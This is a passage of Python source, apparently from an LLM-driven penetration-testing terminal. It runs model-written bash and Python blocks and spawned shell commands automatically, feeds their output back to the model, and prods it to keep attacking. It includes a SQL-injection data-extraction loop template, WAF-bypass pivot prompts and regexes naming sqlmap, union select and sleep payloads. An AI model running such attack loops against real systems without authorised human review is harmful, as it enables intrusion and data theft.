                _HDR_LINE_PAT = _re.compile(r'^[A-Za-z][A-Za-z0-9\-]+\s*:\s*\S')
                # 항상 표시할 중요 패턴
                _IMP_PAT = _re.compile(
                    r'(?:'
                    r'HTTP/\d'
                    r'|status[=:\s]+\d{3}'
                    r'|\b(?:200|201|204|301|302|307|308|400|401|403|404|429|500|502|503)\b'
                    r'|content-length\s*:\s*\d'
                    r'|location\s*:\s*https?'
                    r'|set-cookie\s*:'
                    r'|server\s*:\s*\S'
                    r'|x-powered-by'
                    r'|waf|cloudflare|cf-ray'
                    r'|error|exception|traceback'
                    r'|found|vuln|inject|payload|xss|sqli|rce|lfi|ssrf'
                    r'|\[\+\]|\[-\]|\[!\]|\[\*\]'
                    r'|✅|❌|⚠|🔍|💥|🚨|⛔|🔴|🟢|🟡'
                    r'|Parameter:|Endpoint:|Target:|WAF:|Tech:|결과:|발견:|탐지:'
                    r')',
                    _re.IGNORECASE,
                )

                def _smart_display(ln: str) -> None:
                    """v5.2.7: 스마트 필터 — AI에는 모든 줄 전달, 화면엔 핵심만."""
                    nonlocal _disp_html_run, _disp_hdr_run, _disp_suppressed
                    s = ln.strip()
                    if not s:
                        return

                    # ① 항상 표시: 중요 패턴 포함 줄
                    if _IMP_PAT.search(s):
                        _disp_html_run = 0
                        _disp_hdr_run  = 0
                        _do_print(ln)
                        return

                    # ② HTTP 헤더 블록 제어
                    if _HDR_LINE_PAT.match(s):
                        _disp_hdr_run += 1
                        _disp_html_run = 0
                        if _disp_hdr_run <= _MAX_HDR_RUN:
                            _do_print(ln)
                        elif _disp_hdr_run == _MAX_HDR_RUN + 1:
                            _suppress_notice("hdr")
                        else:
                            _disp_suppressed += 1
                        return
                    else:
                        if _disp_hdr_run > _MAX_HDR_RUN:
                            # 헤더 블록 끝 — 억제 요약 출력 후 리셋
                            _flush_suppress_notice()
                        _disp_hdr_run = 0

                    # ③ HTML 태그 밀집 줄 제어
                    _htag_n = len(_HTML_TAG_PAT.findall(s))
                    if _htag_n >= 2 or (s.startswith("<") and s.endswith(">")):
                        _disp_html_run += 1
                        _disp_hdr_run = 0
                        if _disp_html_run <= _MAX_HTML_RUN:
                            _do_print(ln)
                        elif _disp_html_run == _MAX_HTML_RUN + 1:
                            _suppress_notice("html")
                        else:
                            _disp_suppressed += 1
                        return
                    else:
                        if _disp_html_run > _MAX_HTML_RUN:
                            _flush_suppress_notice()
                        _disp_html_run = 0

                    # ④ 긴 줄 잘라서 표시 (JSON body, 긴 URL 등)
                    if len(s) > _MAX_LINE_DISP:
                        short = s[:_MAX_LINE_DISP] + f"  [dim]…+{len(s)-_MAX_LINE_DISP}c[/dim]"
                        _do_print(short, raw=True)
                        return

                    # ⑤ 나머지 일반 줄 — 그대로 표시
                    _do_print(ln)

                def _do_print(txt: str, raw: bool = False) -> None:
                    with _lock:
                        try:
                            if raw:
                                self.console.print(f"[{THEME['dim']}]{txt}[/]")
                            else:
                                self.console.print(f"[{THEME['dim']}]{_resc(txt)}[/]")
                        except Exception:
                            self.console.out(txt)

                _suppress_label: str = ""

                def _suppress_notice(kind: str) -> None:
                    nonlocal _suppress_label, _disp_suppressed
                    _suppress_label = kind
                    _disp_suppressed = 1
                    _lbl = {"html": "HTML", "hdr": "headers"}.get(kind, kind)
                    with _lock:
                        try:
                            self.console.print(
                                f"[{THEME['dim']}]  ⋯ [{_lbl} output suppressed — full data sent to AI][/]"
                            )
                        except Exception:
                            pass

                def _flush_suppress_notice() -> None:
                    nonlocal _disp_suppressed, _suppress_label
                    if _disp_suppressed > 0:
                        with _lock:
                            try:
                                _lbl = {"html": "HTML lines", "hdr": "header lines"}.get(
                                    _suppress_label, "lines"
                                )
                                self.console.print(
                                    f"[{THEME['dim']}]  ⋯ {_disp_suppressed} {_lbl} hidden[/]"
                                )
                            except Exception:
                                pass
                        _disp_suppressed = 0
                        _suppress_label = ""
                # ──────────────────────────────────────────────

                for raw_line in p.stdout:
                    _mark_output_activity()
                    line = raw_line.decode("utf-8", "replace").rstrip()
                    if not line:
                        continue

                    _stripped_cur = line.strip()

                    # v3.2.25: 연쇄 예외 구분자 무음 억제 (Traceback 블록 사이에 출력되는 잡음)
                    if _stripped_cur in _CHAINED_EXC_MSGS:
                        all_lines.append(f"[suppressed] {_stripped_cur}")
                        continue

                    # v3.2.23: 실시간 Traceback 필터 — 스트리밍 중 감지 즉시 버퍼링
                    if _stripped_cur == "Traceback (most recent call last):":
                        if _in_tb and _tb_buf:
                            _flush_tb_compressed(len(_tb_buf))
                        _in_tb = True
                        _tb_buf.append(line)
                        all_lines.append(line)
                        continue

                    if _in_tb:
                        _tb_buf.append(line)
                        all_lines.append(line)
                        # 들여쓰기 없는 예외 줄 = Traceback 블록 끝
                        if line and not line[0].isspace() and ":" in line:
                            _flush_tb_compressed(len(_tb_buf))
                        continue

                    # AI 컨텍스트에는 항상 전체 줄 보존
                    all_lines.append(line)
                    # 터미널에는 스마트 필터 적용 (v5.2.7)
                    _smart_display(line)

                    # 전체 타임아웃 체크 [v5.1.6: p.terminate()→os.killpg() — 자식 curl 포함 종료]
                    if __import__("time").time() - _start_ts > _SCRIPT_TIMEOUT:
                        _killed_reason = f"TIMEOUT_{_SCRIPT_TIMEOUT}s"
                        task["killed_reason"] = _killed_reason
                        _kill_process_group(p)
                        break

                    # 연속 중복 감지 (스캔 결과 라인은 더 높은 임계값 적용)
                    _cur = _stripped_cur
                    if _cur and _cur == _last_stripped:
                        _consec_count += 1
                        _loop_threshold = _MAX_CONSEC_SCAN if _is_scan_result_line(_cur) else _MAX_CONSEC_DUP
                        # v6.2.44: 반복 감지 시 강제 종료 비활성화 — 사용자 Ctrl+C 로 중단
                    else:
                        _consec_count = 0
                        _last_stripped = _cur

                # v3.2.23: EOF 후 미처리 Traceback 버퍼 플러시
                if _in_tb and _tb_buf:
                    _flush_tb_compressed(len(_tb_buf))

                # 워치독 종료 신호 (정상 완료 시)
                _watchdog_fired.set()

                # 워치독이 kill 했는지 확인 (stdout 없는 블로킹 타임아웃)
                _killed_reason = _killed_reason or task.get("killed_reason")
                if not _killed_reason and (
                    __import__("time").time() - _start_ts >= _SCRIPT_TIMEOUT - 1
                ):
                    _killed_reason = f"TIMEOUT_{_SCRIPT_TIMEOUT}s"

                try:
                    p.wait(timeout=5)
                except Exception:
                    try:
                        p.kill()
                    except Exception:
                        pass
                output = "\n".join(all_lines)
                task["returncode"] = p.returncode
                task["output_length"] = len(output)
                _kill_suffix = ""
                if _killed_reason:
                    if _killed_reason.startswith("INFINITE_LOOP:"):
                        _dup_val = _killed_reason.split(":", 1)[1]
                        _k_title = t("script_killed_infinite", "[SCRIPT_KILLED: INFINITE_LOOP detected]")
                        _k_same = t("script_killed_same_val", "Same value '{val}' repeated {n}+ times.").replace("{val}", _dup_val).replace("{n}", str(_MAX_CONSEC_DUP))
                        _k_fix = t("script_killed_mandatory_fix", "MANDATORY FIX — Your enumeration loop has NO deduplication.")
                        _k_cursor = t("script_killed_cursor_must", "You MUST rewrite with cursor pagination pattern:")
                        _kill_suffix = (
                            f"\n{_k_title}\n"
                            f"{_k_same}\n"
                            f"{_k_fix}\n"
                            f"{_k_cursor}\n"
                            "  seen = set()\n"
                            "  last_hex = ''\n"
                            "  while True:\n"
                            "      if last_hex:\n"
                            "          payload = f'... AND name > {last_hex} ...'\n"
                            "      result = extract(payload)\n"
                            "      if not result or result in seen: break\n"
                            "      seen.add(result)\n"
                            "      last_hex = '0x' + result.encode().hex().upper()\n"
                            "STOP using FOR loops with TOP 1 and no cursor.\n"
                        )
                    else:
                        if _killed_reason.startswith("IDLE_TIMEOUT_"):
                            _k_idle = t(
                                "script_killed_idle_timeout",
                                "[SCRIPT_KILLED: IDLE_TIMEOUT]\n"
                                "Script produced no output for {sec}s and was forcibly terminated.\n"
                                "Add per-request timeouts, reduce loops, or split the script into smaller blocks.",
                            ).replace("{sec}", str(_IDLE_TIMEOUT))
                            _kill_suffix = f"\n{_k_idle}\n"
                        else:
                            _k_timeout = t("script_killed_timeout", "[SCRIPT_KILLED: TIMEOUT]\nScript exceeded {sec}s timeout and was forcibly terminated.\nSplit the script into smaller blocks or optimize the loop.").replace("{sec}", str(_SCRIPT_TIMEOUT))
                            _kill_suffix = f"\n{_k_timeout}\n"
                if output.strip():
                    # v3.2.23: AI 컨텍스트 전달 시 잔여 Traceback도 압축
                    _ai_out, _, _ = _filter_traceback(output)
                    results_text[slot] = (
                        f"=== {prefix} ({label}) ===\n"
                        f"{_ai_out.strip()}\n"
                        f"=== EXIT: {p.returncode} ==={_kill_suffix}"
                    )
                else:
                    results_text[slot] = (
                        f"=== {prefix} ({label}) ===\n"
                        f"(no output, exit={p.returncode}){_kill_suffix}"
                    )
            except Exception as e:
                _err_msg2 = str(e)
                # v6.2.20: I/O on closed file → 무시
                if "closed file" not in _err_msg2 and "I/O operation" not in _err_msg2:
                    try:
                        with _lock:
                            self.console.print(f"[{THEME['error']}]  exec error:[/] {_resc(_err_msg2)}")
                    except Exception:
                        pass
                results_text[slot] = f"=== EXEC ERROR: {_err_msg2} ==="

        threads = [
            threading.Thread(target=_tracked_run_task, args=(task, i), daemon=True)
            for i, task in enumerate(tasks)
        ]
        for _th in threads:
            _th.start()

        # 30초마다 진행 상황 표시 + Ctrl+C 즉시 감지 (v3.2.99)
        _s = self.s
        self.console.print(
            f"[{THEME['dim']}]⏳ {_s.get('exec_parallel', 'Running')} "
            f"{len(threads)} {_s.get('exec_scripts', 'scripts in parallel')}...[/]"
        )

        # ★ v3.2.99: HEARTBEAT 30→1 — Ctrl+C 후 최대 1초 내 반응 (기존 최대 30초)
        HEARTBEAT = 1   # 1초마다 stop_flag 체크 (heartbeat 출력은 30초마다)
        elapsed = 0
        _heartbeat_print_interval = 30  # 화면 출력은 30초에 한 번
        # v5.1.6: wall-clock 안전 타임아웃 — 워치독이 bash만 kill하고 자식 curl이 살아남아
        # 스레드가 종료되지 않는 경우에 대한 2차 방어선.
        # v6.2.210: 24h 기본 대기를 제거하고 BINGO_EXEC_TIMEOUT 기반으로 제한.
        while any(_th.is_alive() for _th in threads):
            for _th in threads:
                _th.join(timeout=HEARTBEAT)
            elapsed += HEARTBEAT

            # ★ Ctrl+C 감지 즉시 처리 (우선순위 최상위)
            if self._agent_stop_flag.is_set():
                self.console.print(
                    f"[{THEME['warn']}]⚠ {_s.get('exec_timeout_soft', 'Interrupted — collecting partial results')}[/]"
                )
                # ★ v3.2.99: os.killpg로 프로세스 그룹 전체 종료 (WSL/VM 호환)
                import signal as _sig
                import os as _os
                with proc_list_lock:
                    for p in proc_registry:
                        try:
                            pgid = _os.getpgid(p.pid)
                            _os.killpg(pgid, _sig.SIGTERM)
                        except Exception:
                            try:
                                p.terminate()
                            except Exception:
                                pass
                # 2초 대기 후 강제 kill (좀비 방지)
                import time as _kt
                _kt.sleep(2)
                with proc_list_lock:
                    for p in proc_registry:
                        try:
                            if p.poll() is None:
                                try:
                                    pgid = _os.getpgid(p.pid)
                                    _os.killpg(pgid, _sig.SIGKILL)
                                except Exception:
                                    try:
                                        p.kill()
                                    except Exception:
                                        pass
                        except Exception:
                            pass
                for _th in threads:
                    _th.join(timeout=3)
                for i, r in enumerate(results_text):
                    if not r:
                        results_text[i] = "=== INTERRUPTED — partial results only ==="
                break

            # 30초마다 진행상황 heartbeat 출력
            if elapsed % _heartbeat_print_interval == 0 and any(_th.is_alive() for _th in threads):
                self.console.print(
                    f"[{THEME['dim']}]  ⏱ {elapsed}s {_s.get('exec_running', 'running')}...[/]"
                )

            # v5.1.6: wall-clock 최대 타임아웃 — 워치독 실패 시 2차 강제 종료
            # bash kill 후 자식 curl 프로세스가 stdout을 유지해 스레드가 무한 대기하는 버그 방어
            if elapsed >= _WALL_CLOCK_MAX:
                import signal as _wc_sig
                import os as _wc_os
                self.console.print(
                    f"[bold red]"
                    f"{_s.get('wall_clock_timeout_kill', '⚠ WALL-CLOCK TIMEOUT ({elapsed}s) — force-killing process group').format(elapsed=elapsed)}"
                    f"[/]"
                )
                with proc_list_lock:
                    for _wp in proc_registry:
                        try:
                            pgid = _wc_os.getpgid(_wp.pid)
                            _wc_os.killpg(pgid, _wc_sig.SIGKILL)
                        except Exception:
                            try:
                                _wp.kill()
                            except Exception:
                                pass
                        try:
                            _wp.stdout.close()
                        except Exception:
                            pass
                for _th in threads:
                    _th.join(timeout=2)
                for i, r in enumerate(results_text):
                    if not r:
                        results_text[i] = (
                            f"=== WALL-CLOCK TIMEOUT ({elapsed}s) — "
                            "script forcibly killed, partial results only ==="
                        )
                break

        filtered_results = [r for r in results_text if r]
        self._last_execution_context = {
            "executed": bool(tasks),
            "source": "code_block",
            "scripts": [
                {
                    "type": task.get("type", ""),
                    "code": task.get("code", ""),
                    "returncode": task.get("returncode"),
                    "output_length": task.get("output_length", 0),
                }
                for task in tasks
            ],
            "response_bytes": sum(len(item) for item in filtered_results),
        }
        return filtered_results

    def _execute_ai_commands(
        self,
        response: str,
        _depth: int = 0,
        _loaded_skills: set | None = None,
    ) -> None:
        """
        AI가 ```python / ```bash 블록을 제시하면 실행하고 결과를 피드백.
        재귀 호출 없이 while 루프로 동작 — Python 콜 스택 쌓이지 않음.
        SKILL_LOAD 체인은 depth로 제한(별도 로직).
        """
        from ..models.registry import ModelRegistry

        if _loaded_skills is None:
            _loaded_skills = set()

        # ── SKILL_LOAD: depth 기반 제한 (스킬 체인 전용) ──────────────
        if _depth > 30:
            self._suggest_next_steps()
            return

        skill_names = self._parse_skill_load_request(response)
        new_skills = [s for s in skill_names if s not in _loaded_skills]
        if new_skills:
            _loaded_skills.update(new_skills)
            skill_content = self._load_skill_content(new_skills)
            if skill_content:
                self.history.append(Message(
                    role="user",
                    content=(
                        "=== SKILL CONTENT INJECTED (use this expert knowledge) ===\n"
                        + skill_content
                        + "\n=== END SKILLS ===\n"
                        "Now continue with the task using this expert knowledge. "
                        "Do NOT declare SKILL_LOAD again for already-loaded skills: "
                        + ", ".join(_loaded_skills)
                    )
                ))
                model_cfg = self.config.get_active_model_config()
                if model_cfg:
                    model = ModelRegistry.build(model_cfg)
                    self.console.print(
                        f"\n[bold cyan]⚡ {self.s.get('skill_applying', 'Applying skill knowledge...')} "
                        f"[{', '.join(new_skills)}][/bold cyan]"
                    )
                    new_response = self._stream_response(
                        model.chat_stream(self._build_messages(""))
                    )
                    self.history.append(Message(role="assistant", content=new_response))
                    if "```" in new_response:
                        self._execute_ai_commands(new_response, _depth=_depth + 1, _loaded_skills=_loaded_skills)
                    return

        # ── v6.2.159 SPAWN_SUBAGENT 처리 (Type A auto-corrector) ────────────
        # AI가 "SPAWN_SUBAGENT:<id>:<desc>:<bash_cmd>" 형식으로 서브에이전트 지시 가능
        if getattr(self, "_intel_ready", False) and "SPAWN_SUBAGENT:" in response:
            import re as _sa_re
            for _sa_m in _sa_re.finditer(
                r"SPAWN_SUBAGENT:([^:\n]+):([^:\n]+):(.+?)(?=\nSPAWN_SUBAGENT:|$)",
                response,
                _sa_re.DOTALL,
            ):
                _sa_id = _sa_m.group(1).strip()[:32]
                _sa_desc = _sa_m.group(2).strip()[:128]
                _sa_cmd = _sa_m.group(3).strip()[:1024]
                if _sa_id and _sa_cmd:
                    def _make_sa_fn(_cmd=_sa_cmd):
                        def _fn():
                            import subprocess, os
                            r = subprocess.run(
                                _cmd, shell=True,
                                capture_output=True, text=True, timeout=60,
                                env={**os.environ, "PYTHONUNBUFFERED": "1"},
                            )
                            return (r.stdout + r.stderr)[:4096]
                        return _fn
                    spawned = self._subagent_pool.spawn(_sa_id, _sa_desc, _make_sa_fn())
                    _spawn_label = {
                        "ko": f"🔀 서브에이전트 [{_sa_id}] 생성: {_sa_desc}",
                        "zh": f"🔀 子代理 [{_sa_id}] 已创建: {_sa_desc}",
                        "en": f"🔀 SubAgent [{_sa_id}] spawned: {_sa_desc}",
                    }
                    try:
                        from ..i18n import get_lang as _sa_gl
                        _spawn_msg = _spawn_label.get(_sa_gl(), _spawn_label["en"])
                    except Exception:
                        _spawn_msg = _spawn_label["en"]
                    self.console.print(f"[bold cyan]{_spawn_msg}[/bold cyan]")
        # ─────────────────────────────────────────────────────────────────────

        # ── 메인 에이전트 루프 (while — 재귀 없음) ────────────────────
        current_response = response
        _no_code_retry = 0  # AI가 코드 없이 텍스트만 보낸 횟수
        _auto_report_defer_count = 0

        while True:
            # 코드 블록 없으면 → AI에게 코드 작성 재촉 (최대 3회)
            # v5.2.2: TOOL_CALL이 있으면 "코드 없음" 처리 우회 — _run_code_blocks에서 처리
            if "```" not in current_response and "TOOL_CALL:" not in current_response:
                _defer_reason = ""
                # ── v3.2.86: Web3/DApp 감사 JSON은 코드 블록 없어도 정상 완료 ──
                _web3_data = self._is_web3_audit_json(current_response.strip())
                if _web3_data is not None:
                    # 이미 _stream_response에서 예쁘게 출력됨 → 보고서 자동 저장
                    _lang = getattr(self.config, "lang", "en")
                    _done_msg = self.s.get("web3_audit_complete", {
                        "ko": "✅ 스마트 컨트랙트 감사 완료",
                        "zh": "✅ 智能合约审计完成",
                        "en": "✅ Smart Contract Audit Complete",
                    })
                    if isinstance(_done_msg, dict):
                        _done_msg = _done_msg.get(_lang, "✅ Audit Complete")
                    self.console.print(f"\n[bold green]{_done_msg}[/bold green]")
                    self._auto_generate_report()
                    break

                if _no_code_retry >= 3:
                    _done_counts = BingoTerminal._finding_evidence_counts(
                        getattr(self, "_findings_exporter", None)
                    )
                    _defer_reason = BingoTerminal._auto_report_defer_reason(
                        current_response,
                        _done_counts,
                        getattr(self, "_exec_loop_count", 0),
                        trigger="no_code_retry",
                    )
                    if _defer_reason:
                        _auto_report_defer_count += 1
                        if _auto_report_defer_count >= 4:
                            self._suggest_next_steps()
                            break
                        _no_code_retry = 0
                    else:
                        # 3회 재촉해도 코드 없고 evidence gate를 통과하면 완료로 판단
                        self._auto_generate_report()
                        break
                _no_code_retry += 1
                _lang = getattr(self.config, "lang", "en")
                _nudge = {
                    "ko": "계속 진행할 경우, 다음 검증 가설을 확인하는 실행 가능한 bash 또는 python 코드 블록을 작성하세요. 현재 URL/쿠키/헤더/기준 응답을 보존하세요.",
                    "zh": "如需继续，请给出一个可执行的 bash 或 python 代码块来验证下一个假设，并保留当前 URL/Cookie/Header/基线响应。",
                    "en": "If continuing, provide a runnable bash or python code block that verifies the next hypothesis while preserving the current URL/cookies/headers/baseline.",
                }.get(_lang, "Provide a runnable verification code block while preserving current request state.")
                if _defer_reason:
                    _defer_hint = {
                        "ko": (
                            "\n[REPORT_DEFERRED_NO_EVIDENCE]\n"
                            f"자동 보고서는 보류됨: {_defer_reason}. "
                            "보고서 대신 실제 실행 가능한 단일 TOOL_CALL 또는 코드 블록으로 계속 검증하세요."
                        ),
                        "zh": (
                            "\n[REPORT_DEFERRED_NO_EVIDENCE]\n"
                            f"自动报告已延后: {_defer_reason}. "
                            "不要生成报告，继续输出一个可执行的 TOOL_CALL 或代码块进行验证。"
                        ),
                        "en": (
                            "\n[REPORT_DEFERRED_NO_EVIDENCE]\n"
                            f"Auto report deferred: {_defer_reason}. "
                            "Do not report yet; continue with one executable TOOL_CALL or code block."
                        ),
                    }.get(_lang, f"\n[REPORT_DEFERRED_NO_EVIDENCE]\nAuto report deferred: {_defer_reason}.")
                    _nudge += _defer_hint
                self.history.append(Message(role="user", content=f"[BINGO_EXECUTION_HINT]\n{_nudge}"))
                from ..models.registry import ModelRegistry as _MR
                _mc = self.config.get_active_model_config()
                if not _mc:
                    break
                _m = _MR.build(_mc)
                current_response = self._stream_response(_m.chat_stream(self._build_messages("")))
                if current_response:
                    self.history.append(Message(role="assistant", content=current_response))
                continue

            _no_code_retry = 0  # 코드 있으면 카운터 리셋

            # Repeated blocked SQLi receives an AI-led pivot advisory.  It must
            # not suppress the model-selected executable step; Bingo still runs
            # the current verifier and uses the result as evidence.
            _sqli_state = getattr(self, "_adaptive_attack_state", {}).get("sqli", {})
            _sqli_cooldown = int(_sqli_state.get("cooldown", 0) or 0)
            if _sqli_cooldown > 0:
                import re as _pivot_guard_re
                _tool_names = _pivot_guard_re.findall(
                    r'TOOL_CALL\s*:\s*\{[^{}]*?"name"\s*:\s*"([^"]+)"',
                    current_response,
                    _pivot_guard_re.I | _pivot_guard_re.S,
                )
                _code_only = "\n".join(_pivot_guard_re.findall(
                    r'```(?:bash|sh|python)\s*(.*?)```',
                    current_response,
                    _pivot_guard_re.I | _pivot_guard_re.S,
                ))
                _repeats_sqli = any(
                    name.lower().startswith(("sqli", "sqlmap", "bool_oracle"))
                    or name.lower() in {"run_sqlmap", "run_ghauri"}
                    for name in _tool_names
                ) or bool(_pivot_guard_re.search(
                    r'\bsqlmap\b|\bghauri\b|boolean.?oracle|extractvalue\s*\('
                    r'|updatexml\s*\(|union\s+(?:all\s+)?select|sleep\s*\(',
                    _code_only,
                    _pivot_guard_re.I,
                ))
                if _repeats_sqli:
                    _sqli_state["cooldown"] = _sqli_cooldown - 1
                    _guard_msg = self.s.get(
                        "sqli_cross_vector_guard",
                        "[AI_LED_PIVOT_ADVISORY] Repeated SQLi blocks detected. "
                        "Prefer a different vector unless this run uses a new verifier. "
                        "Current executable action is not blocked.",
                    )
                    self.history.append(Message(
                        role="user",
                        content=(
                            f"{_guard_msg}\n"
                            "[CURRENT_ACTION_NOT_BLOCKED]\n"
                            "Execute the current model-selected step. In the next analysis, "
                            "prefer sqli/waf_bypass skill reasoning and one bounded verifier "
                            "instead of repeating the same blocked request."
                        ),
                    ))
                else:
                    _sqli_state["cooldown"] = 0

            # 코드 실행 (코드 블록이 있으면 반드시 실행)
            results_text = self._run_code_blocks(current_response, _loaded_skills)

            # v6.2.172: TOOL_RESULT 세션 로그 기록 (이전엔 TOOL_RESULT=0 버그)
            if results_text:
                for _tr_log in results_text:
                    if _tr_log and _tr_log.strip():
                        self._append_to_session_log("tool_result", _tr_log[:4000])

            # ── v4.9.0: 텍스트 레벨 환각 스캐너 ────────────────────────────────
            # Gap 1 수정: 코드 블록 밖 텍스트에서 미실행 결과 서술 탐지
            # 상황: LLM이 ```python 코드 없이 텍스트로 "DB명이 X로 확인됨" 같은 환각을 서술
            # 탐지: 코드 블록 제거 → 순수 텍스트에서 결과 주장 패턴 검사
            # 조건: 실행 결과가 없고(results_text 비어 있음) + 텍스트에 결과 서술 존재 → 주입
            try:
                import re as _thal_re
                # 코드 블록 제거해 순수 텍스트만 추출
                _text_only = _thal_re.sub(r'```[\s\S]*?```', '', current_response).strip()
                if _text_only and not results_text:
                    _TEXT_HAL_RE = _thal_re.compile(
                        r"(?:"
                        # 중국어
                        r"(?:返回了|返回结果|查询结果为|执行结果|我们得到了)[：:\s].{3,60}"
                        r"|(?:结果[是为]|得到了|获取到了|发现了)\s*.{3,60}"
                        r"|(?:数据库名?|表名|用户名|版本号?)\s*(?:为|是|=|:)\s*.{2,40}"
                        r"|(?:DB|数据库|版本)\s*[=:是为]\s*['\"]?.{2,40}"
                        # 영어
                        r"|(?:the\s+)?(?:db|database|version|username|table)\s+(?:is|was|=)\s*['\"]?.{2,40}"
                        r"|(?:shows?|reveals?|indicates?|confirmed|extracted)\s+(?:the\s+)?(?:db|version|user|table).{3,50}"
                        r"|(?:we\s+(?:found|got|confirmed|extracted))\s+(?:the\s+)?(?:db|version|user).{3,50}"
                        # 한국어
                        r"|(?:반환됨|추출됨|확인됨|발견됨|검출됨)\s*[：:\s].{2,50}"
                        r"|(?:DB|버전|사용자|테이블)\s*(?:은|는|이|가)?\s*.{2,40}(?:임|였|이다|입니다|으로\s*확인)"
                        r"|✅\s*\[?(?:VERIFIED|확인)\]?\s*.{2,60}"
                        r")",
                        _thal_re.IGNORECASE,
                    )
                    _th_m = _TEXT_HAL_RE.search(_text_only)
                    if _th_m:
                        _lang_th = getattr(self.config, "lang", "en")
                        _th_snippet = _th_m.group(0)[:80].strip()
                        _th_feedback = {
                            "ko": (
                                f"[TEXT_HALLUCINATION_DETECTED v4.9.6]\n"
                                f"코드 실행 없이 텍스트로 결과를 서술했습니다: '{_th_snippet}'\n"
                                f"이것은 실제 실행 결과가 아닙니다. 반드시 ```bash 블록으로 "
                                f"curl 명령을 작성하고 실제 HTTP 응답을 print() 하세요."
                            ),
                            "zh": (
                                f"[TEXT_HALLUCINATION_DETECTED v4.9.6]\n"
                                f"在未执行代码的情况下，通过文字描述了结果: '{_th_snippet}'\n"
                                f"这不是真实的执行结果。必须用 ```bash 代码块运行curl，"
                                f"只报告实际HTTP响应输出。"
                            ),
                            "en": (
                                f"[TEXT_HALLUCINATION_DETECTED v4.9.6]\n"
                                f"You described results in text without executing code: '{_th_snippet}'\n"
                                f"This is not real execution output. You MUST write a ```bash block "
                                f"with real curl commands and only report actual HTTP response output."
                            ),
                        }.get(_lang_th, (
                            f"[TEXT_HALLUCINATION_DETECTED v4.9.6] "
                            f"Claimed result without code: '{_th_snippet}' — "
                            f"Write a ```bash block with real curl calls."
                        ))
                        self.console.print(f"[bold red]⛔ {_th_feedback}[/bold red]")
                        self.history.append(Message(role="user", content=_th_feedback))
            except Exception:
                pass  # 스캐너 오류는 무시 — 실행 차단하지 않음



            # ── v3.2.71-A: 응답 크기 변화 감지 → SQLi 우선 강제 ─────────────────
            # 증상: AI가 응답 크기 차이(정상 vs 주입)를 관찰하고도 SQLi 대신 브루트포스 등 다른
            #       벡터로 전환. 크기 차이는 매우 강력한 SQLi 인디케이터이므로 즉시 강제 전환.
            # 탐지: 출력에 "정상=?B vs 주입=?B" 또는 "normal=Xb, injected=Yb" 같은 크기 비교가
            #       있고, 두 값의 차이가 ≥ 100 이면 SQLi로 직행.
            import re as _szr
            _combined_out = "\n".join(results_text) if results_text else ""

            # ── v3.5.17: VPN 가상 IP(198.18.x.x) 오염 감지 → 실제 IP 자동 조회 ──
            # macOS VPN: DNS → 198.18.0.0/15 가상 IP 반환 → 포트스캔 결과 전부 가짜
            # ★ VPN을 끄라는 게 아님 — VPN 유지한 채 실제 IP를 다른 방법으로 찾아서 계속 진행
            if _combined_out and results_text:
                try:
                    from ..core.phantom_guard import check_vpn_virtual_ip_contamination as _vpn_check
                    _pg_lang_v = getattr(self.config, "lang", "zh")
                    _vpn_warn = _vpn_check(_combined_out, lang=_pg_lang_v)
                    if _vpn_warn:
                        # 현재 세션의 타겟 도메인 추출
                        _vpn_target = getattr(self.config, "target", "") or ""

                        # ── 실제 IP 조회 시도 (VPN 유지 상태) ─────────────────
                        _real_ips: list[str] = []

                        # 방법 1: dig @8.8.8.8 (Google DNS 직접 질의 — VPN DNS 우회)
                        if _vpn_target:
                            try:
                                import subprocess as _sp_vpn
                                _dig_domain = _vpn_target.replace("https://", "").replace("http://", "").split("/")[0]
                                _dig_r = _sp_vpn.run(
                                    ["dig", "@8.8.8.8", "+short", _dig_domain],
                                    capture_output=True, text=True, timeout=8
                                )
                                for _line in _dig_r.stdout.strip().splitlines():
                                    _line = _line.strip()
                                    import re as _re_vpn2
                                    if _re_vpn2.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", _line):
                                        if not _line.startswith("198.18.") and not _line.startswith("198.19."):
                                            _real_ips.append(_line)
                            except Exception:
                                pass

                        # 방법 2: nslookup 백업 (dig 없을 경우)
                        if not _real_ips and _vpn_target:
                            try:
                                import subprocess as _sp_ns
                                _ns_domain = _vpn_target.replace("https://", "").replace("http://", "").split("/")[0]
                                _ns_r = _sp_ns.run(
                                    ["nslookup", _ns_domain, "8.8.8.8"],
                                    capture_output=True, text=True, timeout=8
                                )
                                import re as _re_ns
                                for _m in _re_ns.finditer(r"Address:\s*([\d.]+)", _ns_r.stdout):
                                    _ip = _m.group(1).strip()
                                    if not _ip.startswith("8.8.") and not _ip.startswith("198.18.") and not _ip.startswith("198.19."):
                                        _real_ips.append(_ip)
                            except Exception:
                                pass

                        # ── 결과 처리 ──────────────────────────────────────────
                        _lang_v = getattr(self.config, "lang", "zh")
                        if _real_ips:
                            # 실제 IP 찾음 → AI에게 "이 IP로 다시 스캔하라" 주입
                            _real_ip_str = ", ".join(_real_ips[:3])
                            _inject_msg = self.s.get(
                                "vpn_dns_spoof_inject_ok",
                                "[VPN_DNS_SPOOF_AUTO_FIXED]\nReal IP for {target} (Google DNS): {ips}\nRe-run scan with these IPs. Keep VPN ON."
                            ).format(target=_vpn_target, ips=_real_ip_str)
                            _banner = self.s.get(
                                "vpn_dns_spoof_fixed",
                                "🔍 [VPN DNS Spoof] Real IPs: {ips} — continuing"
                            ).format(ips=f"[bold green]{_real_ip_str}[/bold green]")
                            self.console.print(f"\n{_banner}")
                        else:
                            # 실제 IP 조회 실패 → AI에게 Shodan/crt.sh 대안 지시
                            _inject_msg = self.s.get(
                                "vpn_dns_spoof_inject_fail",
                                "[VPN_DNS_SPOOF_DETECTED]\nAuto-resolve failed. Try Shodan/crt.sh for {target}. Keep VPN ON."
                            ).format(target=_vpn_target)
                            _banner_warn = self.s.get(
                                "vpn_dns_spoof_fallback",
                                "⚠️  [VPN DNS Spoof] Auto-resolve failed — AI will try Shodan/crt.sh fallback"
                            )
                            self.console.print(f"\n[bold yellow]{_banner_warn}[/bold yellow]")

                        # AI에게 상황 주입 후 응답 요청
                        self.history.append(Message(role="user", content=_inject_msg))
                        from ..models.registry import ModelRegistry as _MR_vpn
                        _mc_vpn = self.config.get_active_model_config()
                        if _mc_vpn:
                            _m_vpn = _MR_vpn.build(_mc_vpn)
                            current_response = self._stream_response(
                                _m_vpn.chat_stream(self._build_messages(""))
                            )
                            if current_response:
                                self.history.append(
                                    Message(role="assistant", content=current_response)
                                )
                        continue
                except Exception:
                    pass  # VPN 감지 오류는 실행 차단하지 않음

            # v6.2.10: 0day Hunter 제거 — 자동 탐지가 오탐 다수 발생 (git_exposure on HTTP 400 등)
